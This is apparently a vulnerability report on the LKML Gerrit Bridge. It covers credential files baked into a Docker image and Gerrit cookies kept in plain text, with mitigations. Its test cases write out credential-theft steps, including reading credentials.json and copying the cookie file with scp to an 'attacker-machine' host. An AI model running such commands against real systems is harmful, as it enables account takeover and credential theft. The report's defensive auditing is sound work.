### Vulnerability List:

#### 1. Hardcoded Gerrit and Google Cloud Credentials in Docker Image

* Description:
    1. The `Dockerfile` copies the `gerritcookies` and `credentials.json` files directly into the Docker image during the build process using the `COPY` instruction.
    2. This means that these credential files, which contain sensitive authentication information for Gerrit and Google Cloud respectively, are embedded within every instance of the Docker image created.
    3. An attacker who gains access to the Docker image (e.g., through registry access, compromised CI/CD pipeline, or if the image is inadvertently made public) can extract these files.
    4. By extracting `gerritcookies`, the attacker can impersonate an authenticated user and gain unauthorized access to the linked Gerrit instance.
    5. Similarly, extracting `credentials.json` grants access to Google Cloud resources, although the immediate impact on Gerrit access via this file is less direct but still a security concern.

* Impact:
    - **Critical:** Unauthorized access to the Gerrit instance. An attacker can bypass Gerrit authentication, gaining the ability to read, modify, and potentially delete code, reviews, and other resources within the Gerrit system. Depending on the permissions associated with the Gerrit user whose credentials are stolen, the attacker's actions could range from data breaches to complete compromise of the Gerrit project. Additionally, unauthorized access to Google Cloud resources via `credentials.json` could lead to further security breaches and resource misuse.

* Vulnerability Rank: Critical

* Currently Implemented Mitigations:
    - None. The `Dockerfile` explicitly copies the credential files into the image.

* Missing Mitigations:
    - **Do not embed credentials in Docker images:** Credentials should never be hardcoded or copied into Docker images.
    - **Use Docker Secrets or Volume Mounts:** Implement secure credential management by using Docker Secrets or volume mounts to inject the `gerritcookies` and `credentials.json` files at runtime, instead of embedding them at build time. This ensures that the credentials are not part of the image layers and are only accessible to the running container.
    - **Principle of Least Privilege for Credentials:** Ensure that the Gerrit user associated with the `gerritcookies` file and the Google Cloud service account associated with `credentials.json` have the minimum necessary permissions required for the bridge to function. This limits the potential damage if the credentials are compromised.

* Preconditions:
    1. An attacker must gain access to the Docker image. This could happen through various means, such as:
        - Access to the Docker image registry where the image is stored.
        - Compromise of the CI/CD pipeline that builds and pushes the Docker image.
        - If the Docker image is inadvertently made publicly available.
        - Access to the filesystem of a server where the Docker image is stored (less likely in typical deployments, but possible).

* Source Code Analysis:
    - **File: `/code/Dockerfile`**
    ```dockerfile
    # copy the gerrit cookies file to the working directory
    COPY gerritcookies .

    # copy the gcloud credentials file to the working directory
    COPY credentials.json .
    ```
    - The `COPY gerritcookies .` and `COPY credentials.json .` lines in the `Dockerfile` directly embed the `gerritcookies` and `credentials.json` files into the Docker image at the `/code/` working directory.
    - During the Docker image build process, these files become part of the image layers.
    - Anyone who can `docker pull` or otherwise access the built image can then `docker run` a container from this image and access `/code/gerritcookies` and `/code/credentials.json` within the container's filesystem, effectively extracting the credentials.

* Security Test Case:
    1. **Prerequisites:**
        - Access to the built Docker image (e.g., `myimage` as described in `README.md`).
        - Docker installed on the attacker's machine.
    2. **Steps:**
        ```bash
        # Run a container from the Docker image
        docker run -it --name vulnerable_container myimage /bin/bash

        # Inside the container, navigate to the working directory
        cd /code

        # List files to confirm gerritcookies and credentials.json are present
        ls -l

        # Extract the gerritcookies file (example, could be copied to attacker's host)
        cat gerritcookies

        # Extract the credentials.json file (example, could be copied to attacker's host)
        cat credentials.json

        # Exit the container
        exit

        # Remove the container (optional, for cleanup)
        docker rm vulnerable_container
        ```
    3. **Expected Result:**
        - The `ls -l` command inside the container will show `gerritcookies` and `credentials.json` files in the `/code/` directory.
        - The `cat gerritcookies` and `cat credentials.json` commands will output the contents of these files, revealing the Gerrit and Google Cloud credentials to the attacker.
        - This confirms that the credentials are embedded within the Docker image and easily accessible.

#### 2. Insecure Storage of Gerrit Authentication Cookies on Disk

* Description:
    1. The `README.md` and `gerrit.py` files instruct users to manually create a `gerritcookies` file in the project directory and place Gerrit HTTP authentication cookies within it.
    2. The application code, specifically in `gerrit.py`, then directly reads these cookies from the `gerritcookies` file to authenticate with the Gerrit API.
    3. Storing authentication credentials in a plain text file on the server's filesystem creates a significant vulnerability.
    4. If an attacker gains unauthorized access to the server running the LKML Gerrit Bridge (e.g., through a web application vulnerability, SSH compromise, or other server-side attacks), they can easily locate and steal the `gerritcookies` file.
    5. With the `gerritcookies` file, the attacker can directly authenticate to the Gerrit instance as the user associated with these cookies, bypassing normal login procedures.

* Impact:
    - **High:** Unauthorized access to the Gerrit instance. Stealing the `gerritcookies` file provides the attacker with persistent authentication to Gerrit, allowing them to perform actions as the legitimate user. The scope of impact is similar to vulnerability 1, but the attack vector is different (server compromise instead of Docker image access).

* Vulnerability Rank: High

* Currently Implemented Mitigations:
    - None. The project explicitly instructs users to store cookies in a file named `gerritcookies` and directly uses this file for authentication.

* Missing Mitigations:
    - **Secure Credential Storage:** Avoid storing sensitive authentication credentials in plain text files on the filesystem.
    - **Operating System Level Security:** Rely on operating system level security mechanisms to protect credential files. Ensure proper file system permissions are set so that only the application user can read the `gerritcookies` file. However, this is not a robust mitigation against a determined attacker who compromises the server.
    - **Credential Management System:** Integrate with a secure credential management system (e.g., HashiCorp Vault, CyberArk, or cloud provider secret management services) to store and retrieve Gerrit credentials securely.
    - **Short-Lived Credentials:** Consider using short-lived authentication tokens or rotating credentials regularly to limit the window of opportunity for an attacker if credentials are compromised.

* Preconditions:
    1. The LKML Gerrit Bridge server must be running and configured with `gerritcookies` as instructed.
    2. An attacker must gain unauthorized access to the server's filesystem. This could be through:
        - Exploiting vulnerabilities in web applications running on the same server.
        - SSH brute-force or credential theft.
        - Local file inclusion or path traversal vulnerabilities (if applicable).
        - Physical access to the server (less likely in typical deployments).

* Source Code Analysis:
    - **File: `/code/README.md`**
    ```markdown
    Then you need to copy the cookies that were added to a file called
    `gerritcookies` in this directory.

    NOTE: YOU MUST ADD A COMMENT TO THE TOP OF THE COOKIE FILE: `# HTTP Cookie File`
    ```
    - This section of the README instructs users to create and name the cookie file as `gerritcookies` in the project directory, clearly indicating the intended insecure storage method.

    - **File: `/code/src/gerrit.py`**
    ```python
    def get_gerrit_rest_api(cookie_jar_path: str, gerrit_url: str) -> GerritRestAPI:
        cookie_jar = MozillaCookieJar(cookie_jar_path)
        cookie_jar.load()
        auth = HTTPCookieAuth(cookie_jar)
        rest = GerritRestAPI(url=gerrit_url, auth=auth)
        return rest
    ```
    - The `get_gerrit_rest_api` function in `gerrit.py` directly loads cookies from the file path provided by `cookie_jar_path`, which is set to `gerritcookies` in `main.py`.
    - `MozillaCookieJar` is used to load cookies from the specified file, confirming that the application directly reads and uses the `gerritcookies` file for Gerrit authentication.

* Security Test Case:
    1. **Prerequisites:**
        - A running instance of the LKML Gerrit Bridge, configured with a `gerritcookies` file.
        - Attacker access to the server's filesystem (e.g., via SSH if credentials are known, or by exploiting another vulnerability to gain shell access).
    2. **Steps:**
        ```bash
        # Attacker gains access to the server (example: via SSH)
        ssh attacker@vulnerable-server

        # Navigate to the project directory where gerritcookies is likely located (assuming known project path or through reconnaissance)
        cd /path/to/lkml-gerrit-bridge/code/

        # List files to locate gerritcookies
        ls -l

        # Copy the gerritcookies file to attacker's controlled machine (example using scp)
        scp gerritcookies attacker@attacker-machine:/tmp/

        # Alternatively, simply read the content of the gerritcookies file on the compromised server
        cat gerritcookies
        ```
    3. **Expected Result:**
        - The attacker is able to locate and copy or read the `gerritcookies` file from the server's filesystem.
        - By using the stolen `gerritcookies` file, the attacker can authenticate to the Gerrit instance outside of the bridge application (e.g., using `curl` with the cookies or by setting up a local Gerrit client with these cookies).
        - This demonstrates that the insecure storage of `gerritcookies` allows for credential theft and unauthorized Gerrit access upon server compromise.
